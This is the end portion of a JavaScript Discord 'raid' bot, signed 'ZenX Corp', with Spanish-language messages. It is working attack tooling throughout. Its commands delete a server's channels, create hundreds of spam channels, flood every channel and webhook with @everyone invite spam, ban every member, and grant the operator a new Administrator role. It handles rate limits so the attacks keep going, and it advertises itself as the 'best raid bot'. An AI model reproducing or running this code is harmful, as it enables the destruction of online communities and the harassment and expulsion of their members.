                        .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/zCQ8jQ2GBf)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/zCQ8jQ2GBf`)
                        .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                    ]});})
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${nk_number} canales del servidor eliminados correctamente.`)]});
                };
            };
            const chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                delete_ch(ch.id, chs.size);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_2+"guild.createchannels"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            let nm_ch_atck = users_data[msg.author.id]?.nm_channels_attack ? users_data[msg.author.id].nm_channels_attack : "zenx-on-top";
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            let raidk = false;
            let raidk_number = 0;
            async function crear_ch(channel_name) {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guildxd.id}/channels`, {
                    method: 'POST',
                    headers: {
                        "Authorization": `Bot ${bot_token}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: `${channel_name}`,
                        type: 0
                    }),
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await wait_ms(resJson["retry_after"]);
                    if(nm_ch_atck === "zenx-on-top"){
                        const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                        await crear_ch(raid_canal_nombres[randomNameIndex]);
                    } else {
                        await crear_ch(nm_ch_atck);
                    }
                } else {
                    raidk_number++;
                };
                if(raidk_number === 500 && !raidk){
                    raidk = true
                    msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${raidk_number} canales creados correctamente.`)]})
                    return;
                };
            };
            for (let index = 0; index < 500; index++) {
                if(nm_ch_atck === "zenx-on-top"){
                    const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                    crear_ch(raid_canal_nombres[randomNameIndex]);
                } else {
                    crear_ch(nm_ch_atck);
                }
                await wait_ms(10);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_2+"guild.spam"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            async function spam_ch(ch_id) {
                const chxd = guildxd.channels.cache.get(ch_id);
                for (let index = 0; index < 30; index++) {
                    try {
                        chxd.send({content:`** https://discord.gg/zCQ8jQ2GBf **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                            new EmbedBuilder()
                            .setTitle(` ‎                           ‎ **SERVER FUCKED BY ZENX**\n ‎                                 ‎ **#WAPNED REPLIKT**`)
                            .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/zCQ8jQ2GBf)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/zCQ8jQ2GBf`)
                            .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                        ]});
                    } catch (e) {};
                };
            };
            const chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                spam_ch(ch.id);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_2+"guild.massban"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            let m_i=0;
            let ms = await guildxd.members.fetch();
            for (let m of ms.values()) {
                try {
                    await m.ban("https://discord.gg/zCQ8jQ2GBf");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} miembros baneados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.webhookspam"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            async function spam_wh(wh_url) {
                try {
                    const whxd = new WebhookClient({url:wh_url});
                for (let index = 0; index < 100; index++) {
                    try {
                        await whxd.send({content:`** https://discord.gg/zCQ8jQ2GBf **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                            new EmbedBuilder()
                            .setTitle(` ‎                           ‎ **SERVER FUCKED BY ZENX**\n ‎                                 ‎ **#WAPNED REPLIKT**`)
                            .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/zCQ8jQ2GBf)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/zCQ8jQ2GBf`)
                            .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                        ]});
                    } catch (e) {
                        console.log(e.message);
                    };
                };
                } catch (e) {
                    console.log(e.message);
                }
            };
            let i_wh=0;
            let wh_b=false;
            let webhooks = [];
            async function create_webhok(ch_id, ch_size) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}/webhooks`,{
                        method:"POST",
                        headers:{
                            "Authorization":`Bot ${bot_token}`,
                            "content-type":"application/json"
                        },
                        body: JSON.stringify({
                            "name":"$ ZenX Corp On Top | .gg/zCQ8jQ2GBf"
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 200){
                        i_wh++;
                        webhooks.push(`https://discord.com/api/webhooks/${resJson['id']}/${resJson['token']}`);
                        if(i_wh>=ch_size && !wh_b){
                            wh_b=true;
                            for (let wh of webhooks.values()) {
                                spam_wh(wh);
                            };
                        };
                    } else if(res.status === 429){
                        if(resJson['retry_after']){
                            await wait_ms(resJson['retry_after']+100);
                        };
                    };
                } catch (e) {console.log(e)}
            };
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                create_webhok(ch.id, chs.size);
                await wait_ms(30);
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.existentwebhookspam"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            async function spam_wh(wh_url) {
                try {
                    const whxd = new WebhookClient({url:wh_url});
                    for (let index = 0; index < 100; index++) {
                        try {
                            await whxd.send({content:`** https://discord.gg/zCQ8jQ2GBf **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY ZENX**\n ‎                                 ‎ **#WAPNED REPLIKT**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/zCQ8jQ2GBf)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/zCQ8jQ2GBf`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {
                            console.log(e.message);
                        };
                    };
                } catch (e) {
                    console.log(e.message);
                }
            };
            let wh_i=0;
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                let whs = await ch.fetchWebhooks();
                for (let wh of whs.values()) {
                    spam_wh(wh.url);
                    wh_i++;
                };
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${wh_i} webhooks obtenidas correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_2+"guild.admin"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            let guild_idxd = users_data[msg.author.id]?.guild_selected ? users_data[msg.author.id].guild_selected : "No definido.";
            if(guild_idxd === "No definido."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: No tienes ninguna guild especificada.`)]});
                return;
            };
            const guildxd = client.guilds.cache.get(guild_idxd);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 wapned bot replikt log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            await guildxd.roles.create({name:`$`,reason:`$ ZenX Corp On Top`, permissions: PermissionsBitField.Flags.Administrator}).then(async (roll)=>{
                await guildxd.members.cache.get(msg.author.id).roles.add(`${roll.id}`);
            });
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: Recibiste el rol más alto posible!`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
});
client.login(bot_token);
//by $ ZenX Corp e.e
